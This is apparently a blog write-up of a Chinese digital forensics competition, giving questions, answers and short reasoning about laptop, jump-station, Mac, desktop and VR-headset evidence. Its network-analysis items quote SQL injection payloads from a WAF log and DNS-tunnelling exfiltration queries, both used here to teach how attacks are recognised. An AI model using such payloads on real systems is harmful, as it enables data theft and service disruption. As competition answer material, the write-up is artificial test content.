src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829824.png"></p><ul><li>[单选题]在检查Ben的记录时,发现了Port 9151的连接,那是指Ben在使用什么浏览器? (2分)</li></ul><blockquote><p>A. Chrome</p><p>B. Tor</p><p>C. Duckduckgo</p><p>D. Edge</p></blockquote><pre><code class="python">B</code></pre><p>9151端口经常被用于控制tor浏览器的本地SOCKS代理端口</p><ul><li>[判断题]参考材料6.pdf,应该保持默认设置,以便 Firefox 浏览器使用 Tor 网络? (2分)</li></ul><blockquote><p>&amp;#x20;正确</p><p>&amp;#x20;错误</p></blockquote><pre><code class="python">正确</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829825.png"></p><p>proxychains 正在使用 Tor 网络（通过 127.0.0.1:9050）进行代理。通常，Firefox 浏览器使用 Tor 网络时，应该保持默认的 proxychains 配置，确保 Firefox 流量通过 Tor 网络传输，而不直接连接到互联网。</p><p>因此保持默认设置是合适的，以确保 Firefox 浏览器通过 Tor 网络使用代理。</p><ul><li>[单选题]参考Ben_Laptop.zip,Ben使用 OpenVPN 5.196.64.231 多少天? (答案格式:只需使用阿拉伯数字回答) (2分)</li></ul><blockquote><p>A. 1</p><p>B. 2</p><p>C. 3</p><p>D. 4</p></blockquote><pre><code class="python">B</code></pre><p>这题是选择找到openvpn的日志文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829826.png"></p><p>导出后查看 发现只有2024年8月10日和2024年8月16日两天的日志记录 判断使用openvpn5.196.64.231两天</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829828.png"></p><ul><li>[填空题]参考Ben_Laptop.zip,他使用了哪种算法加密密码? (答案格式:大写英文字母和符号’-‘ 混合组成) (2分)</li></ul><pre><code class="python">AES-256-CBC</code></pre><p>这题选择查看openvpn的配置文件config.json 导出查看找到AES-256-CBC</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829829.png"></p><ul><li>[单选题]在2024年8月16日17:40:06,发生了什么? i) 无法在套接字(socket)上执行操作 ii) 系统缺乏足够的缓冲区空间 iii) 队列(queue)已满｡ (提示: 1)套接字是用于网络通信的编程接口,允许程序在网络上发送和接收数据, 2) 队列已满是程序试图将更多的元素插入到一个已经达到容量上限的队列中) (2分)</li></ul><blockquote><p>A. i&amp;ii</p><p>B. ii &amp; iii</p><p>C. i&amp;iii</p><p>D. 以上皆是</p></blockquote><pre><code class="python">D</code></pre><p>这题依旧是翻日志 找到题干中说的时间 对应中这部分内容</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829830.png"></p><p>这行英文翻译过来其实就是题干中的i、ii、iii描述</p><ul><li>[单选题]调查员把一只属于Ben的U盘和一张SD卡交给了你进行分析｡ 参考Ben_USB.e01,是什么导致了“满汉全席.jpg”和“满汉全席Secret.jpg”之间的大小差异? (2分)</li></ul><blockquote><p>A. 档案嵌入其中</p><p>B. 像素差异</p><p>C. MAC 时间更改</p><p>D. 错误的档扩展名</p></blockquote><pre><code class="python">A</code></pre><p><del>太好了，是misc，我们有救了(bushi)</del></p><p>取证大师里面找到这两个文件 提取出来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829831.png"></p><p>放010里面看一下 很明显后面多了一个文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829832.png"></p><ul><li>[填空题]参考BenSDCard.e01,Ben的SD卡的解密密码是? (2分)</li></ul><pre><code class="python">IamRich123!</code></pre><p>接上题 从满汉全席Secret.jpg后面提出来一个doc文件 里面有bitlocker密钥和解密密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829833.png"></p><ul><li>[填空题]参考Ben_Laptop.zip,在2024&#x2F;08&#x2F;23 14:54:59 UTC+8,Ben 浏览了哪个网站? (答案格式: “<a href="https://xxxxxx.com/">https://xxxxxx.com/</a>“) (1分)</li></ul><pre><code class="python">https://teamviewer_internal/</code></pre><p>在edge浏览器中找到题干所说时间的历史记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829834.png"></p><ul><li>[填空题]参考Ben_Laptop.zip,Ben 浏览上一题所述的网站时连接到他的计算机的 Wi-Fi MAC 地址是? (答案格式:”A1:B2:C3:D4:E5:F6”) (1分)</li></ul><pre><code class="python">90:61:AE:C0:90:C2</code></pre><p>找不到准确的时间 但是在这个时间段内可以看到都是连接的同一个wifi</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829835.png"></p><ul><li>[单选题]参考Ben_Laptop.zip和Ben_Jumpstation.zip,回答以下问题: Ben的计算机使用下列哪款远程桌面软件访问了Ben的跳转站(Jumpstation)? i:向日葵远程控制 ii:AnyDesk iii:TeamViewer (2分)</li></ul><blockquote><p>A. i&amp;iii</p><p>B. ii&amp;iii</p><p>C. 只有iii</p><p>D. 只有ii</p></blockquote><pre><code class="python">C</code></pre><p>同下面第73题</p><h2 id="Ben的跳转站部分"><a href="#Ben的跳转站部分" class="headerlink" title="Ben的跳转站部分"></a>Ben的跳转站部分</h2><ul><li>[填空题]</li></ul><p>参考Ben_Jumpstation.zip,Ben的跳转站 (Jumpstation)IP 地址和子网掩码(Subnet mask)是什么? (答案格式:192.168.1.1&#x2F;28) (1分)</p><p><del>我是软件小子</del></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829836.png"></p><p>192.168.182.128&#x2F;24&amp;#x20;</p><ul><li>[填空题]</li></ul><p>参考Ben_Jumpstation.zip,在Ben的跳转站(Jumpstation)上,该远程桌面软件中的访问ID是什么? (答案格式:请用阿拉伯数字作答) (2分)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829837.png"></p><p>687062512</p><p>有向日葵和teamview这些软件</p><p>但是看记录只有teamview有连接记录</p><ul><li>[填空题]</li></ul><p>参考Ben_Jumpstation.zip,Alice何时从跳转站(Jumpstation)下载了文件?（请以UTC+8回答） (答案格式:YYYY-MM-DD HH:MM:SS) (2分)</p><p>未找到</p><ul><li>[单选题]</li></ul><p>参考Ben_Jumpstation.zip,有多少个访问ID连接过跳转站 (Jumpstation)? (2分)</p><blockquote><p>A. 1</p><p>B. 2</p><p>C. 5</p><p>D. 6</p></blockquote><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829838.png"></p><p>五个</p><ul><li>[单选题]您正在检查来自 Web 应用程序防火墙的 HTTP流量日志,并注意到以下日志条目: [2023-10-15 11:45:12] “GET &#x2F;search?q&#x3D;%27%3B+SHUTDOWN+– HTTP&#x2F;1.1” 500 [2023-10-15 11:45:15] “GET &#x2F;search?q&#x3D;%27+UNION+SELECT+password+FROM+users+– HTTP&#x2F;1.1” 200 [2023-10-15 11:45:18] “GET &#x2F;search?q&#x3D;%27+OR+1%3D1+– HTTP&#x2F;1.1” 200 根据这些日志条目,下列哪项陈述正确识别了攻击的类型和目标组件? i. 正在尝试 SQL 注入攻击｡ ii. 攻击者瞄准的是 Web 应用程序的数据库｡ iii. 正在执行跨站点脚本 (XSS)攻击｡ iv. 正在瞄准 Web 服务器的操作系统｡ (2分)</li></ul><blockquote><p>A. i &amp; ii</p><p>B. ii &amp; iii</p><p>C. i &amp; iv</p><p>D. iii &amp; iv</p></blockquote><pre><code class="python">A</code></pre><p>很明显的联合注入查询密码的sql语句 描述i、ii是正确的</p><ul><li>[单选题]在对网络日志进行取证分析时,您发现内部主机向可疑網域发出了不寻常的 DNS 查询 Timestamp:2024-09-23 12:00:00 Query:dGhpc3Bj.susdomain.com Type:TXT Timestamp:2024-09-23 12:05:00 Query:cGFzc3dvcmRpcw&#x3D;&#x3D;.susdomain.com Type:TXT Timestamp:2024-09-23 12:10:00 Query:TWVpeWEyMDI0.susdomain.com Type:TXT 结果顯示包含大量 base64 编码数据,攻击者使用了什么技术? (2分)</li></ul><blockquote><p>A. 域生成算法 (DGA)用于 C2 通信</p><p>B. 快速通量 DNS 用于隐藏恶意服务器</p><p>C. DNS 缓存投毒用于复位向流量</p><p>D. DNS 隧道用于数据泄露</p></blockquote><pre><code class="python">D</code></pre><p>从提供的信息中可以看出，内部主机向可疑域发出了多次DNS查询，这些查询中的数据是Base64编码的。这种行为通常与通过DNS协议传输数据的技术有关。</p><p>具体分析如下：</p><p>DNS查询中包含Base64编码的数据（如dGhpc3Bj、cGFzc3dvcmRpcw&#x3D;&#x3D;等），这表明攻击者可能在使用DNS查询来传输信息。</p><p>这种技术通常被称为DNS隧道，用于在正常的DNS查询中嵌入、传输和隐藏数据，从而绕过传统的网络监控手段进行数据泄露或命令控制通信。</p><p>基于上述分析，攻击者使用的技术是：DNS 隧道用于数据泄露</p><p>DNS隧道是一种利用DNS协议将数据隐写在DNS查询或响应中的技术，可以用于绕过防火墙或监控系统进行隐秘通信。</p><ul><li>[单选题]在检查内部客户端和外部服务器之间的捕获包,您注意到以下Transport Layer Security (TLS) 握手消息: Client Hello: Supported Versions:TLS 1.0, TLS 1.1, TLS 1.2 Cipher Suites:TLS_RSA_WITH_3DES_EDE_CBC_SHA, TLS_RSA_WITH_RC4_128_SHA Server Hello: Selected Version:TLS 1.0 Cipher Suite:TLS_RSA_WITH_RC4_128_SHA 鉴于客户端和服务器都支持更高版本的 TLS 和更强的加密套件,下列哪些是降级的合理解释? i. 中间人攻击导致协议降级｡ ii. 错误配置导致回退到较弱的加密方式｡ iii. 由于客户端与服务器的兼容性问题,属于正常操作｡ (2分)</li></ul><blockquote><p>A. i &amp; ii</p><p>B. 只有ii</p><p>C. 只有i</p><p>D. 以上皆是</p></blockquote><pre><code class="python">A</code></pre><p>在 TLS 握手中，降级到较低的 TLS 版本和较弱的加密套件通常有两种合理解释：</p><p>中间人攻击（选项 i）：</p><p>中间人攻击可能迫使通信双方使用较低版本的 TLS 或较弱的加密套件，以便更容易拦截或解密传输内容。</p><p>攻击者可能通过篡改握手数据来引导客户端和服务器使用不安全的加密方式。</p><p>错误配置（选项 ii）：</p><p>客户端或服务器的配置不当也可能导致降级，例如优先选择不安全的加密套件或没有启用更高版本的 TLS。</p><p>错误配置可能是由于服务器端设置不符合最佳安全实践，导致连接回退到支持的最低版本和加密套件。</p><p>选项 iii 的解释：</p><p>兼容性问题导致的正常操作在本题中不太合理。题干指出客户端和服务器都支持更高版本和更强的加密套件，因此这种情况不应属于兼容性问题导致的正常操作。</p><ul><li>[单选题]參考以下HTTP访问日誌片段: 192.168.1.1 - - [12&#x2F;Oct&#x2F;2023:14:55:36 +0000] “GET &#x2F;index.html HTTP&#x2F;1.1” 200 1024 192.168.1.15 - - [12&#x2F;Oct&#x2F;2023:14:56:10 +0000] “POST &#x2F;login.php HTTP&#x2F;1.1” 200 512 192.168.1.10 - - [12&#x2F;Oct&#x2F;2023:14:57:01 +0000] “GET &#x2F;admin&#x2F;dashboarD:php HTTP&#x2F;1.1” 403 256 192.168.1.20 - - [12&#x2F;Oct&#x2F;2023:14:58:25 +0000] “GET &#x2F;index.html HTTP&#x2F;1.1” 200 1024 哪个IP地址试图访问受限页面? (2分)</li></ul><blockquote><p>A. 192.168.1.15</p><p>B. 192.168.1.10</p><p>C. 192.168.1.20</p><p>D. 192.168.1.1</p></blockquote><pre><code class="python">B</code></pre><p>整理一下</p><pre><code class="python">192.168.1.1 - - [12/Oct/2023:14:55:36 +0000] &quot;GET /index.html HTTP/1.1&quot; 200 1024 192.168.1.15 - - [12/Oct/2023:14:56:10 +0000] &quot;POST /login.php HTTP/1.1&quot; 200 512 192.168.1.10 - - [12/Oct/2023:14:57:01 +0000] &quot;GET /admin/dashboarD:php HTTP/1.1&quot; 403 256 192.168.1.20 - - [12/Oct/2023:14:58:25 +0000] &quot;GET /index.html HTTP/1.1&quot; 200 1024</code></pre><p>这四条日志记录中 第三条在ip192.168.1.10访问&#x2F;admin&#x2F;dashboarD:php时返回了 <strong>403</strong> 错误代码，表示该页面是受限的</p><ul><li>[单选题]參考以下网络数据包捕获的十六进制部分: 0000 00 1a a0 b0 c0 d0 00 1b c1 d1 e1 f1 08 00 45 00 0010 00 3c 1c 46 40 00 40 06 a6 ec c0 a8 01 0a c0 a8 0020 01 14 00 50 d1 5c 1a 2b 3c 4d 5e 6f 70 80 90 a0 0030 b0 c0 d0 e0 f0 00 00 00 00 50 02 20 00 b5 e2 00 数据包的源IP地址是什么? (2分)</li></ul><blockquote><p>A. 192.168.1.10</p><p>B. 192.168.1.20</p><p>C. 10.0.0.1</p><p>D. 172.16.0.1</p></blockquote><pre><code class="python">A</code></pre><p>恢复一下 应该是</p><pre><code class="python">0000 00 1a a0 b0 c0 d0 00 1b c1 d1 e1 f1 08 00 45 000010 00 3c 1c 46 40 00 40 06 a6 ec c0 a8 01 0a c0 a80020 01 14 00 50 d1 5c 1a 2b 3c 4d 5e 6f 70 80 90 a00030 b0 c0 d0 e0 f0 00 00 00 00 50 02 20 00 b5 e2 00</code></pre><p>源IP地址位于第26到29字节(c0 a8 01 0a) 所以应该是192.168.1.10</p><ul><li>[单选题]题目见描述（81） (2分)參考以下Wireshark捕获摘要:<br>No.  Time           Source              Destination          Protocol    Length     Info<br>1      0.000000   192.168.1.10   192.168.1.255    ARP          42            Who has 192.168.1.255? Tell 192.168.1.10<br>2      0.005000   192.168.1.20   192.168.1.10      ICMP         98            Echo (ping) request<br>3      0.010000   192.168.1.10   192.168.1.20      ICMP         98            Echo (ping) reply<br>4      0.020000   192.168.1.30   192.168.1.10      TCP           66            12345 &gt; 80 [SYN] Seq&#x3D;0 Win&#x3D;64240 MSS&#x3D;1460<br>5      0.025000   192.168.1.10   192.168.1.30      TCP           66            80 &gt; 12345 [SYN, ACK] Seq&#x3D;0 Ack&#x3D;1 Win&#x3D;64240 MSS&#x3D;1460<br>6      0.030000   192.168.1.30   192.168.1.10      TCP           54            12345 &gt; 80 [ACK] Seq&#x3D;1 Ack&#x3D;1 Win&#x3D;64240<br>描述此捕获中发生的事件顺序｡</li></ul><blockquote><p>A.&amp;#x20;</p><p>Ping请求后发送ARP请求</p><p>B.&amp;#x20;</p><p>ARP请求、Ping交换和TCP握手</p><p>C.&amp;#x20;</p><p>TCP握手后发送ARP请求</p><p>D.&amp;#x20;</p><p>仅存在ICMP流量</p></blockquote><pre><code class="python">B</code></pre><p>第1个数据包：源 192.168.1.10 向广播地址 192.168.1.255 发送 ARP 请求，扫描IP 地址 192.168.1.255</p><p>第2和第3个数据包：源 192.168.1.20 发送 ICMP Echo 请求（Ping），目的地址为 192.168.1.10，并得到 ICMP Echo 回复。</p><p>第4、5和6个数据包：源 192.168.1.30 向 192.168.1.10 发起 TCP 三次握手（SYN、SYN-ACK、ACK），尝试建立连接。</p><ul><li>[单选题]题目见描述（82） (2分)參考服务器上netstat命令的以下输出:<br>Active Internet connections (servers and established)<br>Proto     Recv-Q     Send-Q     Local Address     Foreign Address   State<br>tcp        0      0 0.0.0.0:22        0.0.0.0:*         LISTEN<br>tcp        0      0 192.168.1.10:22   203.0.113.20:54321 ESTABLISHED<br>tcp        0      0 192.168.1.10:80   198.51.100.5:12345 ESTABLISHED<br>tcp        0      0 192.168.1.10:443  203.0.113.25:23456 ESTABLISHED<br>哪些服务当前正在服务器上运行并监听?</li></ul><blockquote><p>A.&amp;#x20;</p><p>在80端口上的SSH和54321端口上的HTTP</p><p>B.&amp;#x20;</p><p>仅在22端口上的SSH</p><p>C.&amp;#x20;</p><p>在22端口上的SSH,12345端口上的HTTP,以及443端口上的HTTPS</p><p>D.&amp;#x20;</p><p>仅在23456端口上的HTTPS</p></blockquote><pre><code class="python">C</code></pre><p>根据提供的信息：</p><p>0.0.0.0:22 LISTEN 表示服务器正在监听 22端口，这是常见的 SSH 服务。</p><p>192.168.1.10:80 ESTABLISHED 表示在 80端口 上有一个与远程地址 198.51.100.5:12345 的 HTTP 连接。</p><p>192.168.1.10:443 ESTABLISHED 表示在 443端口 上有一个与远程地址 203.0.113.25:23456 的 HTTPS 连接。</p><p>因此，服务器上有 SSH 服务在 22端口 上监听，HTTP 服务在 80端口 上活跃，以及 HTTPS 服务在 443端口 上活跃。</p><ul><li>[单选题]参考以下电子邮件头信息: From:”John Doe” &lt;<a href="mailto:&#106;&#111;&#104;&#110;&#x2e;&#x64;&#x6f;&#101;&#x40;&#x65;&#x78;&#97;&#x6d;&#x70;&#x6c;&#x65;&#x2e;&#99;&#x6f;&#109;">&#106;&#111;&#104;&#110;&#x2e;&#x64;&#x6f;&#101;&#x40;&#x65;&#x78;&#97;&#x6d;&#x70;&#x6c;&#x65;&#x2e;&#99;&#x6f;&#109;</a>&gt; To:”Jane Smith” &lt;<a href="mailto:&#x6a;&#x61;&#110;&#101;&#x2e;&#x73;&#x6d;&#105;&#116;&#x68;&#x40;&#99;&#111;&#109;&#x70;&#97;&#x6e;&#x79;&#46;&#99;&#x6f;&#x6d;">&#x6a;&#x61;&#110;&#101;&#x2e;&#x73;&#x6d;&#105;&#116;&#x68;&#x40;&#99;&#111;&#109;&#x70;&#97;&#x6e;&#x79;&#46;&#99;&#x6f;&#x6d;</a>&gt; Date:Thu, 12 Oct 2023 19:00:00 +0000 Subject:Important Update Received:from unknown (HELO mail.example.com) (192.0.2.10) by mail.company.com with SMTP; Thu, 12 Oct 2023 19:00:05 +0000 X-Mailer:PHPMailer 5.2 识别可能表明电子邮件被伪造的任何异常｡ (2分)</li></ul><blockquote><p>A.&amp;#x20;</p><p>使用了PHPMailer 5.2</p><p>B.&amp;#x20;</p><p>电子邮件头部显示未知发件人</p><p>C.&amp;#x20;</p><p>电子邮件在19:00:00发送,但在19:00:05接收</p><p>D.&amp;#x20;</p><p>主题是”重要更新”</p></blockquote><pre><code class="python">B</code></pre><p>猜测Received:from unknown 显示未知发件人可能表明电子邮件被伪造</p><ul><li>[单选题]在网络取证中,您会检查TCP&#x2F;IP数据包中的哪个字段来验证数据在传输过程中是否受到了破坏? (1分)</li></ul><blockquote><p>A.&amp;#x20;</p><p>TCP序列号</p><p>B.&amp;#x20;</p><p>数据包大小</p><p>C.&amp;#x20;</p><p>校验和(Checksum)</p><p>D.&amp;#x20;</p><p>目标端口</p></blockquote><pre><code class="python">C</code></pre><ul><li>[单选题]以下哪个特征最能表明僵尸网络中的指挥与控制(C2)通信? (1分)</li></ul><blockquote><p>A.&amp;#x20;</p><p>高频率的DNS查询到热门域名</p><p>B.&amp;#x20;</p><p>数据包传至255.255.255.255</p><p>C.&amp;#x20;</p><p>与远程服务器进行定期周期性通信</p><p>D.&amp;#x20;</p><p>使用FTP协议进行过多的文件传输请求</p></blockquote><pre><code class="python">C</code></pre><p>僵尸网络的指挥与控制（C2）通信通常表现为 定期的周期性通信，即受感染的设备（僵尸主机）与远程C2服务器之间进行定时连接，以接收指令或发送数据。该周期性的通信是僵尸网络运作的核心，通常在没有明显的异常情况下进行。</p><ul><li>[单选题]在IP封包分析中，哪一個數值最能夠協助推斷封包經過的距離？ (1分)</li></ul><blockquote><p>A.&amp;#x20;</p><p>由于路由无响应导致的数据包丢失增加</p><p>B.&amp;#x20;</p><p>IP封包中的TTL值</p><p>C.&amp;#x20;</p><p>ICMP回显回复中不匹配的序列号</p><p>D.&amp;#x20;</p><p>路由器级别检查IP选项字段的异常</p></blockquote><pre><code class="python">B</code></pre><p>TTL（Time To Live，生存时间）字段是IP封包中的一个重要字段，表示数据包在网络中可以经过的最大跳数（即路由器的数量）。每当数据包经过一个路由器时，TTL值会减1。如果TTL值为0，数据包会被丢弃并发送ICMP“超时”消息回源主机。因此，TTL值是推测数据包经过的距离（即跳数）的直接依据。</p><ul><li>[单选题]通过从跳转站获得的信息(Ben_Jumpstation.zip),你认为Alice的笔记本电脑可能包含与犯罪相关的更多信息｡你建议调查员进一步扣押Alice的笔记本电脑进行分析｡ 参考Alice_Macbook.e01,计算机名称是? (1分)</li></ul><blockquote><p>A.&amp;#x20;</p><p>Alice’s MacBook Pro</p><p>B.&amp;#x20;</p><p>Alice’s Laptop</p><p>C.&amp;#x20;</p><p>Alice’s Mac</p><p>D.&amp;#x20;</p><p>Alice’s MacBook</p></blockquote><pre><code class="python">A</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829839.png"></p><ul><li>[填空题]参考Alice_Macbook.e01,Alice的计算机运行的macOS Monterey版本是? (答案格式:123.456.789) (1分)</li></ul><pre><code class="python">12.7.4</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829840.png"></p><ul><li>[填空题]参考Alice_Macbook.e01,Alice的计算机的EN0 MAC地址是? (答案格式: xx:xx:xx:xx:xx:xx, 小写英文字母和阿拉伯数字混合组成) (1分)</li></ul><pre><code class="python">F4:5C:89:A1:C0:07</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829841.png"></p><ul><li>[填空题]参考Alice_Macbook.e01,Alice在2024年8月19日收到了一个包含15个人个人资料的Excel文件,她是从哪一个平台下载这个文件的? (答案格式: 请用小写英文作答 (无须留空白位),例如:facebook) (2分)</li></ul><pre><code class="python">whatsapp</code></pre><p>这个其实直接看Alice的Mobile手机是最好的 是John在whatsapp上发到三五成群这个群聊里面的 时间就是8月19日</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829842.png"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829843.png"></p><ul><li>[填空题]承上题,参考Alice_Macbook.e01,Alice是何时在她的Mac上安装了上述应用程序? (答案格式:YYYY-MM-DD HH:MM) (2分)</li></ul><pre><code class="python">2024-08-19 09:57:00</code></pre><p>找到WhatsApp安装程序的下载记录 我更倾向于访问时间是安装时间</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829844.png"></p><ul><li>[填空题]参考Alice_Macbook.e01,Alice在2024年8月19日在计算机上截取了两张屏幕截图,都是关于安置客服人员的电骗中心位置,她是使用哪个浏览器来搜索这个位置? (1分)</li></ul><pre><code class="python">safari</code></pre><p>先找到这两张截图</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829845.png"></p><p>在safari浏览器中找到最近关闭过谷歌地图的记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829846.png"></p><ul><li>[填空题]参考Alice_Macbook.e01,她的计算机的Team Viewer ClientID是多少? (答案格式:只需使用阿拉伯数字回答) (1分)</li></ul><pre><code class="python">358639376</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829847.png"></p><ul><li>[单选题]参考Alice_Macbook.e01,Alice曾经登录Teamviewer并获取一个包含个人数据的excel文件,Alice是透过以下哪一个方法登录Teamviewer以获取该文件? (2分)</li></ul><blockquote><p>A.&amp;#x20;</p><p>Teamviewer Desktop Application</p><p>B.&amp;#x20;</p><p>web.teamviewer.com</p><p>C.&amp;#x20;</p><p>Anydesk</p><p>D.&amp;#x20;</p><p>以上皆不是</p></blockquote><pre><code class="python">A</code></pre><ul><li>[单选题]承上题,上述包含个人数据文件的文件名是? (2分)</li></ul><blockquote><p>A. newfile.xlsx</p><p>B. personal_data.xlsx</p><p>C. Personal_details_2.xlsx</p><p>D. Kingsoft_Et_Stocka.xlsx</p></blockquote><pre><code class="python">C</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829848.png"></p><ul><li>[填空题]承上题,参考Alice_Macbook.e01,Alice是何时通过Teamviewer 获取上述包含个人资料的文件的? (答案格式:YYYY-MM-DD HH:MM) (2分)</li></ul><pre><code class="python">2024-08-23 17:31:53</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829849.png"></p><ul><li>[填空题]参考Alice_Macbook.e01,Alice透过Teamviewer连接另一台计算机以获取文件的Teamviewer ID是多少? (答案格式:只需使用阿拉伯数字回答) (2分)</li></ul><h2 id="John的笔记本部分"><a href="#John的笔记本部分" class="headerlink" title="John的笔记本部分"></a>John的笔记本部分</h2><ul><li>[填空题]同样,跳转站(Ben_Jumpstation.zip)也指向一些可能从John的桌面计算机获取的关键信息。 参考John_Desktop.e01, 系统最后关机时间是? (答案格式:YYYY-MM-DD HH:MM:SS) (2分)</li></ul><pre><code class="python">2024-08-20 17:40:05</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829851.png"></p><ul><li>[单选题]参考John_Desktop.E01, 系统连接USB SanDisk 3.2Gen 1, 其序列号是? (2分)</li></ul><blockquote><p>A. 01010de54f417fee2292cb6b6ed760608009cace6e76a</p><p>B. D9644B9861A106C9DB4FD4599863C856C6789384B</p><p>C. 4f7b6f8fc20f74329994f7d3fac6920a8d0ecd33fabad423</p><p>D. 8fe24bf440f2def1c5182e1a27a4c183f5d6024b758c803</p></blockquote><pre><code class="python">A</code></pre><p>这里可以在USB使用记录中找到序列号 但是只能得到前20位 可以判断出是A选项</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829852.png"></p><ul><li>[判断题]参考John_Desktop.e01, 于2024年8月28日13时57分21, John曾连接过Meta Quest 3吗? (2分)</li></ul><blockquote><p>&amp;#x20;正确</p><p>&amp;#x20;错误</p></blockquote><pre><code class="python">正确</code></pre><p>找到这个usb设备信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829853.png"></p><p>发现最后接入时间： 2024-08-28 13:57:06 最后弹出时间： 2024-08-28 14:15:12 那么可以判断在2024年8月28日13时57分21 John可能连接过Meta Quest 3这个USB设备</p><ul><li>[填空题]参考John_Desktop.E01, John在何时打开了Joshe investment.JPG文件? (答案格式:YYYY-MM-DD HH:MM:SS) (2分)</li></ul><pre><code class="python">2024-08-01 16:13:08</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829854.png"></p><ul><li>[填空题]参考John_Desktop.e01, 用户 “DESKTOP-HDKJIJJ” 的安全标识符(SID)是? (答案格式:大写英文字母,阿拉伯数字和符号’-‘ 混合组成) (2分)</li></ul><pre><code class="python">S-1-5-21-938709476-2694722248-4044499888-1001</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829855.png"></p><ul><li>[单选题]参考John_Desktop.e01, 有多少个用户帐户是停用(disabled)? (2分)</li></ul><blockquote><p>A. 1</p><p>B. 2</p><p>C. 3</p><p>D. 5</p></blockquote><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829856.png"></p><p>虽然有四个停用，但是只有一个是有密码且登录过的，其他的都是系统账户</p><p><code>A</code></p><ul><li>[填空题]参考John_Desktop.E01, 该计算机被动态主机配置协议(DHCP) 所分配的IP位址是? (答案格式:123.123.123.123) (2分)</li></ul><pre><code class="python">172.20.10.2</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829857.png"></p><ul><li>[单选题]参考John_Desktop.E01, DF_2024_08_29_10_01_27_906.mp4 是什么类型的视频? (2分)</li></ul><blockquote><p>A. 自我介绍</p><p>B. 产品锁售</p><p>C. 深伪视频</p><p>D. 足球比赛</p></blockquote><pre><code class="python">C</code></pre><p>找到这个视频 一眼ai换脸 是深伪视频</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829858.png"></p><h2 id="VR眼镜部分"><a href="#VR眼镜部分" class="headerlink" title="VR眼镜部分"></a>VR眼镜部分</h2><p><del>CtrlF大法好</del></p><p>安卓系统的VR眼镜</p><ul><li>[单选题]在搜查John住所期间,调查员检取了一副虛疑實景 (VR) 眼鏡进行了取证检查。 参考Quest_3_2G0YC5ZFB307D7.zip 文件,虛疑實景 (VR) 眼鏡有多少个使用者? (3分)</li></ul><blockquote><p>A. 1</p><p>B. 2</p><p>C. 3</p><p>D. 4</p></blockquote><p><code>A</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829859.png"></p><ul><li>[单选题]参考Quest_3_2G0YC5ZFB307D7.zip,VR 眼鏡默认安装了什么即时通讯软件 (Instant Messaging App)? (3分)</li></ul><blockquote><p>A. WeChat</p><p>B. LINE</p><p>C. WhatsApp</p><p>D. Telegram</p></blockquote><p><code>C</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829860.png"></p><ul><li>[填空题]参考Quest_3_2G0YC5ZFB307D7.zip, 虛疑實景 (VR) 眼鏡应用程序”Gun Raiders”的版本是? (答案格式:1.2.3) (2分)</li></ul><p><code>10.6.5</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829861.png"></p><ul><li>[判断题]参考Quest_3_2G0YC5ZFB307D7.zip,VR 眼镜应用程序”Gun Raiders”,可以启动设备发现或操纵蓝牙 (2分)</li></ul><blockquote><p>&amp;#x20;正确</p><p>&amp;#x20;错误</p></blockquote><p><code>正确</code></p><p>类比apk中的AndroidManifest.xml里的权限写法</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829862.png"></p><ul><li>[填空题]参考Quest_3_2G0YC5ZFB307D7.zip,在DCIM 文件夹内,VR 眼镜有多少视频的文件修改时间是2024年8月13日? (答案格式:请以阿拉伯数字作答) (2分)</li></ul><p><code>3</code></p><p>到<code>\Quest_3_2G0YC5ZFB307D7\android_shared\sdcard\DCIM\v</code>目录下去找，修改日期排序</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411130829863.png"></p><ul><li>[填空题]</li></ul><p>参考Quest_3_2G0YC5ZFB307D7.zip,在提供的网络信息中,虛疑實景 (VR) 眼鏡’wlan0’ 网络接口的 IPv4 地址是? (答案格式:123.123.123.123) (2分)</p><p><code>192.168.1.142</code></p><p><img 